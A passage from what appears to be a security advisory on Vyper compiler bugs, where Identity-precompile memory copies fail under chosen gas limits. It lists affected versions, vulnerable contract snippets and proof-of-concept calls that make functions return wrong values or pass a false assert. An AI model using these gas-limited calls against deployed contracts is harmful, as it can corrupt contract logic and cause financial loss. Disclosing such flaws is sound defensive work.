    a: DynArray[uint256, 4000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    b: DynArray[uint256, 4000] = a
    return b[0]
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">print(c.foo())            # Prints 2
print(c.foo(gas=170000))  # Prints 0
</code></pre>
<h4 id="identity-in-abi-encoding-of-returndata">Identity in ABI Encoding of Returndata</h4>
<ul>
<li>Affected versions: 0.3.2 - 0.4.0</li>
<li>Complex types such as Dynamic array with Strings inside need to be abi encoded before being returned</li>
<li>In that <code>return</code> there is a memory copy which can fail</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
@view
def foo(x: String[1000000], y: String[1000000]) -&gt; DynArray[String[1000000], 2]:
    z: DynArray[String[1000000], 2] = [x, y]
    # Some code
    return z
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata0 = "a"*10
calldata1 = "b"*1000000
c.foo(calldata0, calldata1)                   # Returns correct data
c.foo(calldata0, calldata1, gas=48_400_000)   # Returns incorrect data (only first part)
</code></pre>
<h4 id="assertion-based-on-data-copied-through-identity">Assertion based on data copied through Identity</h4>
<ul>
<li>Affected versions: 0.2.0 - 0.4.0</li>
<li>An incomplete copy operation might falsify the result of a subsequent <code>assert</code></li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@internal
def bar() -&gt; uint256[3000]:
    a: uint256[3000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 